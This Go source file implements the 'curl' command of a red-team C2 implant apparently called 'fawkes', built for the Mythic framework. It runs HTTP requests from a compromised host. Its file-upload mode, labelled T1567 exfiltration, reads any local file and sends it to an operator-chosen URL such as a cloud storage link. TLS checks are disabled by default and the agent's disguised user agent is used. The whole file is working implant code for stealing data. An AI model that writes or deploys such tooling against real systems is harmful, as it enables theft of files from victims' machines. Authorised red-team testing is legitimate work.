package commands

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type CurlCommand struct{}

func (c *CurlCommand) Name() string { return "curl" }
func (c *CurlCommand) Description() string {
	return "Make HTTP requests from the agent's network perspective"
}

type curlArgs struct {
	URL      string          `json:"url"`
	Method   string          `json:"method"`   // GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
	Headers  json.RawMessage `json:"headers"`  // custom headers — JSON string or map
	Body     string          `json:"body"`     // request body for POST/PUT/PATCH
	File     string          `json:"file"`     // file path to upload as request body (T1567 exfiltration)
	Upload   string          `json:"upload"`   // upload mode: "raw" (default, file as body) or "multipart" (multipart/form-data)
	Insecure bool            `json:"insecure"` // skip TLS verification (default: true)
	Timeout  int             `json:"timeout"`  // timeout in seconds (default: 30)
	MaxSize  int             `json:"max_size"` // max response body size in bytes (default: 1MB)
	Output   string          `json:"output"`   // "full" (headers+body), "body" (body only), "headers" (headers only)
}

// parseHeaders handles headers sent as either a JSON object or a JSON string containing a JSON object.
func parseHeaders(raw json.RawMessage) map[string]string {
	if len(raw) == 0 {
		return nil
	}
	// Try direct map first
	var m map[string]string
	if err := json.Unmarshal(raw, &m); err == nil {
		return m
	}
	// Try as JSON string (Mythic sends string params this way)
	var s string
	if err := json.Unmarshal(raw, &s); err == nil && s != "" {
		var m2 map[string]string
		if err := json.Unmarshal([]byte(s), &m2); err == nil {
			return m2
		}
	}
	return nil
}

const (
	defaultCurlTimeout = 30
	defaultMaxSize     = 1024 * 1024 // 1MB
)

func (c *CurlCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -url <URL> [-method GET] [-headers '{\"key\":\"val\"}'] [-body <data>]")
	}

	var args curlArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		args.URL = strings.TrimSpace(task.Params)
	}

	if args.URL == "" {
		return errorResult("Error: url is required")
	}

	if args.Method == "" {
		args.Method = "GET"
	}
	args.Method = strings.ToUpper(args.Method)

	if args.Timeout <= 0 {
		args.Timeout = defaultCurlTimeout
	}

	if args.MaxSize <= 0 {
		args.MaxSize = defaultMaxSize
	}

	if args.Output == "" {
		args.Output = "full"
	}

	// Build HTTP client
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, //nolint:gosec // red team tool — TLS verification disabled by default
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(args.Timeout) * time.Second,
	}

	// Build request body — file upload or inline body
	var bodyReader io.Reader
	var fileSize int64
	var contentType string

	if args.File != "" {
		// File upload mode (T1567 — Exfiltration Over Web Service)
		filePath, err := filepath.Abs(args.File)
		if err != nil {
			return errorf("Error resolving file path: %v", err)
		}
		fileInfo, err := os.Stat(filePath)
		if err != nil {
			return errorf("Error accessing file: %v", err)
		}
		fileSize = fileInfo.Size()

		if strings.ToLower(args.Upload) == "multipart" {
			// Multipart form-data upload
			var buf bytes.Buffer
			writer := multipart.NewWriter(&buf)
			part, err := writer.CreateFormFile("file", filepath.Base(filePath))
			if err != nil {
				return errorf("Error creating multipart form: %v", err)
			}
			fileData, err := os.ReadFile(filePath)
			if err != nil {
				return errorf("Error reading file: %v", err)
			}
			if _, err := part.Write(fileData); err != nil {
				return errorf("Error writing multipart data: %v", err)
			}
			writer.Close()
			bodyReader = &buf
			contentType = writer.FormDataContentType()
		} else {
			// Raw file upload (default — S3 presigned URLs, Azure SAS, generic PUT)
			f, err := os.Open(filePath)
			if err != nil {
				return errorf("Error opening file: %v", err)
			}
			defer f.Close()
			bodyReader = f
			contentType = "application/octet-stream"
		}

		// Default to PUT for file uploads if method not specified
		if args.Method == "GET" {
			args.Method = "PUT"
		}
	} else if args.Body != "" {
		bodyReader = strings.NewReader(args.Body)
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(args.Timeout)*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, args.Method, args.URL, bodyReader)
	if err != nil {
		return errorf("Error creating request: %v", err)
	}

	// Set content type for file uploads (before custom headers so they can override)
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}

	// Set custom headers
	headers := parseHeaders(args.Headers)
	for key, val := range headers {
		req.Header.Set(key, val)
	}

	// Set default User-Agent if not provided — uses agent's configured UA
	if req.Header.Get("User-Agent") == "" && DefaultUserAgent != "" {
		req.Header.Set("User-Agent", DefaultUserAgent)
	}

	// Execute request
	resp, err := client.Do(req)
	if err != nil {
		return errorf("Error executing request: %v", err)
	}
	defer resp.Body.Close()

	// Read response body with size limit
	body, err := io.ReadAll(io.LimitReader(resp.Body, int64(args.MaxSize)+1))
	if err != nil {
		return errorf("Error reading response: %v", err)
	}

	truncated := len(body) > args.MaxSize
	if truncated {
		body = body[:args.MaxSize]
	}

	// Format output
	var sb strings.Builder

	switch args.Output {
	case "headers":
		sb.WriteString(fmt.Sprintf("HTTP/%d.%d %s\n", resp.ProtoMajor, resp.ProtoMinor, resp.Status))
		for key, values := range resp.Header {
			for _, val := range values {
				sb.WriteString(fmt.Sprintf("%s: %s\n", key, val))
			}
		}

	case "body":
		sb.Write(body)
		if !strings.HasSuffix(string(body), "\n") {
			sb.WriteString("\n")
		}

	default: // "full"
		sb.WriteString(fmt.Sprintf("[*] %s %s\n", args.Method, args.URL))
		sb.WriteString(fmt.Sprintf("[*] Status: %s\n", resp.Status))
		sb.WriteString(fmt.Sprintf("[*] Content-Length: %d bytes", len(body)))
		if truncated {
			sb.WriteString(fmt.Sprintf(" (truncated to %d)", args.MaxSize))
		}
		sb.WriteString("\n")

		// Response headers
		sb.WriteString("\n--- Response Headers ---\n")
		for key, values := range resp.Header {
			for _, val := range values {
				sb.WriteString(fmt.Sprintf("%s: %s\n", key, val))
			}
		}

		// Response body
		sb.WriteString("\n--- Response Body ---\n")
		sb.Write(body)
		if !strings.HasSuffix(string(body), "\n") {
			sb.WriteString("\n")
		}
	}

	// Add upload summary if a file was uploaded
	if args.File != "" && fileSize > 0 {
		sb.WriteString(fmt.Sprintf("\n--- Upload Summary ---\nFile: %s (%d bytes)\nMethod: %s\nUpload mode: %s\n",
			args.File, fileSize, args.Method, func() string {
				if strings.ToLower(args.Upload) == "multipart" {
					return "multipart/form-data"
				}
				return "raw (application/octet-stream)"
			}()))
	}

	status := "success"
	if resp.StatusCode >= 400 {
		status = "error"
	}

	structs.ZeroBytes(body)
	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}
